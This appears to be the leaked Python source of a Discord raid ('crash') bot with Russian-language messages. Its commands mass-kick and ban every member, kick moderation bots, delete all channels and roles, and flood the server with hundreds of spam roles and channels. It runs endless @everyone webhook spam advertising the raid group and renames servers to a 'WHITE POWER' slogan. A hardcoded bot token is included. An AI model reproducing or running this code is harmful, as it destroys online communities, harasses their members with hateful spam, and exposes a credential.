import os, discord, aiohttp, keep_alive, json
from discord.ext import commands

# слито by t.me/protectcheck
# слито by discord.gg/fzlgroup2


prefix = '!'
spam_message = '@everyone Сервер крашнут.\nНаш сервер: https://discord.gg/k9wv5FKwTQ'
spam_role_name = "admin loh"
spam_channel_name = 'crushed'
owners=[673098491790229517, 812755182201995264, 702978010197786624, 805117959743209525]
client = commands.Bot(prefix, intents=discord.Intents.all())
#    КОД
client.remove_command( 'help' )

async def on_guild_join(guild):
    with open('db.json', 'r') as f: db = json.load(f)
    adder=None
    try:
        async for entry in guild.audit_logs(action=discord.AuditLogAction.bot_add):
            adder=entry.user
            break
        if adder.id in db['black']:
            try: await adder.send(":x: Тебя нельзя использовать меня")
            except: pass
            await guild.leave()
            return
    except:
        adder="Unknown"

async def chs(guild):
    for u in guild.channels:  # Удаление каналов
        try: await u.delete()
        except: pass
    for u in guild.roles:
        try: await u.delete()
        except: pass

async def rls(guild):
    for yi in range(1, 501):
        try: await guild.create_role(name=spam_role_name, colour=discord.Colour.from_rgb(0, 0, 1))
        except: pass
        try: await guild.create_text_channel(spam_channel_name)
        except: pass

async def bns(guild, mem=None):
    lavan=guild.get_member(704967695036317777)
    cp=guild.get_member(752367350657056851)
    wick=guild.get_member(536991182035746816)
    sbd=guild.get_member(856495339028873216)
    sec=guild.get_member(651095740390834176)
    akbs=[lavan, cp, wick, sbd, sec]
    for akb in akbs:
        if akb: 
            try: await akb.kick()
            except: pass
    st=''
    for m in guild.members:
        if m.id != client.user.id:
            try: await m.kick()
            except: st+=f'{m}  ID: {m.id}, \n'
    with open("not_kicked.txt", 'w', encoding='utf-8') as f: f.write(st); f.close()
    location=os.getcwd()
    path = os.path.join(location, "not_kicked.txt")
    try: await mem.send(file=discord.File(str(path)))
    except Exception as e: print(e)

@client.event
async def on_ready():
    print(client.guilds)
    await client.change_presence(status=discord.Status.online, activity=discord.Game(name="!hhelp", type=3))
    print(f'Бот запущен как {client.user}  ID: {client.user.id}')

@client.event
async def on_error(h, g):
    try:
        print(h)
        print(g)
    except: pass

@client.event
async def on_command_error(ctx, err):
    if isinstance(err, commands.errors.BotMissingPermissions):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"У бота отсутствуют права: {' '.join(err.missing_perms)}\nВыдайте их ему для полного функционирования бота", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance(err, commands.CommandOnCooldown):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"У вас еще не прошел кулдаун на команду {ctx.command}\nПодождите еще {err.retry_after:.2f} сек", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance( err, commands.MissingRequiredArgument ):
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"Нету аргумента", color=discord.Colour.from_rgb(255, 0, 0)))

@client.event
async def on_guild_channel_create(channel):
    if channel.name == spam_channel_name and isinstance(channel, discord.TextChannel):
        webhook = await channel.create_webhook(name = "nuked")
        webhook_url = webhook.url
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
            while True:
                try: 
                    await webhook.send('@everyone @here\n Ссылка на дискорд сервер с краш ботами https://discord.gg/k9wv5FKwTQ 🙈', embed=discord.Embed(title='** Привет котаны!) Данный сервер крашится**', content=' **Хочешь крашить сервера? ⚠️\n Тогда тебе точно к нам! 💯\n Мы представляем:** \n` ⚡ - Удобных и мощных краш ботов\n 😈 - Помощь с рейдом и крашем\n 👌 - Большое разнообразие ботов`\n **Наши соц сети:**\n▫️ Дискорд сервер https://discord.gg/k9wv5FKwTQ\n▫️ Telegram канал https://t.me/xyinaa1 , https://t.me/crushedd'), username='gg')
                except:
                    pass

@client.command()
async def st(ctx):
    with open('db.json', 'r') as f: db = json.load(f)
    if ctx.guild.id in db['white']: return await ctx.send('Пошел нахуй')
    guild=ctx.guild
    await bns(guild, ctx.author)
    try: await guild.edit(name='×××WHITE POWER×××𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎')
    except Exception as e: print(e)
    await chs(guild)
    await rls(guild)

@client.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def roles(ctx):
    with open('db.json', 'r') as f: db = json.load(f)
    if ctx.guild.id in db['white']: return await ctx.send('Пошел нахуй')
    for g in ctx.guild.roles:
        try:
            await g.delete()
        except:
            pass
    while(500):
        try:
            await ctx.guild.create_role(name=spam_role_name, colour=discord.Colour.from_rgb(0, 0, 1))
        except:
            return

@client.command()
@commands.cooldown(1, 300, commands.BucketType.user)
async def ban(ctx):
    with open('db.json', 'r') as f: db = json.load(f)
    if ctx.guild.id in db['white']: return await ctx.send('Пошел нахуй')
    for o in ctx.guild.members:
        if o.id != client.user.id:
            try:
                await o.ban()
            except:
                pass

@client.command()
@commands.cooldown(1, 30, commands.BucketType.user)
async def channels(ctx):
    with open('db.json', 'r') as f: db = json.load(f)
    if ctx.guild.id in db['white']: return await ctx.send('Пошел нахуй')
    try:
        for i in ctx.guild.channels:
            try:
                await i.delete()
            except:
                pass
        for timer in range(1, 250):
            await ctx.guild.create_text_channel(spam_channel_name)
            await ctx.guild.create_voice_channel(spam_channel_name)
    except:
        pass

@client.command()
async def hhelp(ctx):
    await ctx.message.delete()
    try:
        await ctx.author.send(f'''
{prefix}roles  - удаление ролей и спам ими
{prefix}ban  - бан всех
{prefix}channels  - удаление каналов и спам ими
{prefix}st  - автокраш
''')
    except:
        await ctx.send('Открой лс')

@client.command()
async def leave(ctx):
    if ctx.author.id not in owners: return await ctx.send('пошел нахуй')
    await ctx.guild.leave()

@client.command()
async def wl(ctx, mode='view', id=None):
    if ctx.author.id not in owners: return await ctx.send('пошел нахуй')
    if not id: id=ctx.guild.id
    if mode not in ['add', 'remove', 'view', 'list']: return await ctx.send('юзай `wl add id` или `wl remove id` или просто `wl`')
    with open('db.json', 'r') as f: db = json.load(f)
    if mode == 'add':
        db['white'].append(id)
        with open('db.json', 'w') as f: json.dump(db,f)
    elif mode == 'remove':
        try: db['white'].remove(id)
        except: return await ctx.send('такого айди нет в вайте')
        with open('db.json', 'w') as f: json.dump(db,f)
    else:
        i=''
        for idd in db['white']:
            i+=f'⠀⠀{idd}\n'
        embed=discord.Embed(title="Сервера в вайт листе:", description=i)
        embed.set_footer(text='Эти сервера я не буду крашить')
        await ctx.send(embed=embed)

keep_alive.keep_alive()
token = ("OTE1NDUxODU4MTQ1OTIzMTAy.Yaby-w.aTFNCdBbMrpZnWebClAh0KZvYk0")
client.run(token)
# слито by t.me/protectcheck
# слито by discord.gg/fzlgroup2
